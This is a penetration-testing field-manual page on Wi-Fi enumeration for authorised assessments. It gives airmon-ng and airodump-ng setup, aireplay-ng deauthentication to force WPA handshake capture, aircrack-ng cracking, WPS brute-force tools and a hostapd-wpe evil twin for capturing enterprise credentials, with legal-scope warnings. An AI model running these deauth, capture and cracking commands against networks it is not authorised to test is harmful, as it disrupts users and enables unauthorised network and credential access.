---
title: "Wi-Fi Enumeration"
description: "Monitor mode, access point discovery, client mapping, and handshake capture for authorised wireless assessments."
category: "Field Manual"
tags: ["field-manual", "cpts", "wifi", "wireless", "enumeration"]
date: 2026-11-11
published: true
status: archive
---

# Wi-Fi Enumeration

> [!warning] Hardware and legality
> Requires a wireless adapter that supports monitor mode and packet injection (e.g. Atheros AR9271, RTL8812AU, Alfa adapters). Only capture networks you own or are explicitly authorised to test. Do not capture client traffic outside scope.

## Setup

```bash
iwconfig
airmon-ng
airmon-ng check kill
airmon-ng start wlan0
iwconfig wlan0mon
```

Confirm monitor mode:

```bash
iw dev wlan0mon info
```

## Discover access points

```bash
airodump-ng wlan0mon
```

Record:

| Field | Meaning |
|---|---|
| BSSID | AP MAC address |
| PWR | Signal strength |
| CH | Channel |
| ENC | Encryption (WEP, WPA, WPA2, WPA3) |
| CIPHER | CCMP, TKIP |
| AUTH | PSK, MGT (enterprise) |
| ESSID | Network name |

Target a specific AP and channel:

```bash
airodump-ng -c 6 --bssid $BSSID -w capture wlan0mon
```

## Discover clients

The lower table in `airodump-ng` lists stations. Clients reveal:

- Which AP they are associated with.
- Probe requests for other networks (hidden SSIDs).
- Device vendor via MAC OUI.

```bash
airodump-ng --essid $ESSID -c $CH wlan0mon
```

## Capture a handshake

```bash
# Targeted capture
airodump-ng -c $CH --bssid $BSSID -w handshake wlan0mon

# Deauthenticate a client to force reconnection
aireplay-ng --deauth 5 -a $BSSID -c $CLIENT wlan0mon
```

A WPA/WPA2 4-way handshake is saved in `handshake-01.cap`. Verify:

```bash
aircrack-ng handshake-01.cap
```

## WPS discovery

```bash
wash -i wlan0mon
```

WPS-enabled APs may be vulnerable to PIN brute force (`reaver`, `bully`). Check lockout behaviour and scope before testing.

## Hidden SSIDs

A hidden network omits the ESSID in beacons but still appears as a BSSID. Wait for a client probe or association; the ESSID often appears in `airodump-ng` when a client connects. `airgraph-ng` can visualise relationships.

## Enterprise networks

`AUTH = MGT` means 802.1X. Enumeration differs:

- Capture EAPOL to identify the EAP method (PEAP, EAP-TTLS, EAP-TLS).
- `hostapd-wpe` can impersonate the AP and capture MSCHAPv2 challenges for offline cracking.
- Validate certificates; a rogue AP is often detected.
- Credentials may be domain accounts → test against AD.

## Connecting to a network

```bash
# WPA/WPA2 PSK
wpa_passphrase "$ESSID" "$PASSPHRASE" > wpa.conf
wpa_supplicant -B -i wlan0 -c wpa.conf
dhclient wlan0

# Open network
nmcli dev wifi connect "$ESSID"
```

## Tooling

| Tool | Use |
|---|---|
| `airmon-ng` | Monitor mode |
| `airodump-ng` | AP/client discovery and capture |
| `aireplay-ng` | Deauth, injection |
| `aircrack-ng` | Handshake cracking |
| `wash` | WPS enumeration |
| `reaver` / `bully` | WPS attacks |
| `hostapd-wpe` | Enterprise evil twin |
| `wifite` | Automated workflow |
| `kismet` | Passive capture and logging |

## Methodology

- [ ] Confirm adapter supports monitor mode and injection.
- [ ] Survey all APs and clients; record BSSID, channel, encryption, auth.
- [ ] Identify hidden SSIDs, WPS, and enterprise authentication.
- [ ] Capture a handshake for PSK networks; verify it is complete.
- [ ] Crack offline with a targeted wordlist.
- [ ] For enterprise, capture EAP and assess certificate validation.
- [ ] Document signal coverage and rogue APs.

## Pitfalls

- `airmon-ng check kill` stops NetworkManager; restore it afterwards.
- Handshake captures can be incomplete; check `aircrack-ng` output.
- 5 GHz channels require adapter support and correct regulatory domain.
- WPA3/SAE is not cracked by the classic 4-way handshake workflow.
- Deauth is disruptive; use the minimum needed and only in scope.

## References

- [Aircrack-ng documentation](https://www.aircrack-ng.org/doku.php)
- [HackTricks — Wi-Fi](https://book.hacktricks.wiki/en/radio-hacking/wifi/index.html)
- [Wifite](https://github.com/derv82/wifite2)
